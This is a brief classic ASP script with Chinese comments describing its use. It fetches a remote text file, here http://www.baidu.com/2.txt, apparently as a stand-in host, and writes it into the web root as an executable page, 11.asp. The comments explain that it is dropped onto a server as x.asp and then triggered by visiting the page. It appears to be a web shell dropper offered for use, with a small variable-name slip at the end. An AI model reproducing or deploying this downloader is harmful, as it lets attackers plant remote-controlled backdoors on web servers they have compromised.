'意思是把http://www.baidu.com/2.txt这个文件下载到当前目录保存为11.asp
'利用嘛...保存为x.asp，然后去访问http://www.baidu.com/11.asp就行了
'鸡肋的是要求支持数据流上传组建
<%
Set xPost = CreateObject("Microsoft.XMLHTTP")
xPost.Open "GET","http://www.baidu.com/2.txt",False
xPost.Send()
Set sGet = CreateObject("ADODB.Stream")
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile Server.MapPath("11.asp"),2
set sGet = nothing
set sPOST = nothing
%>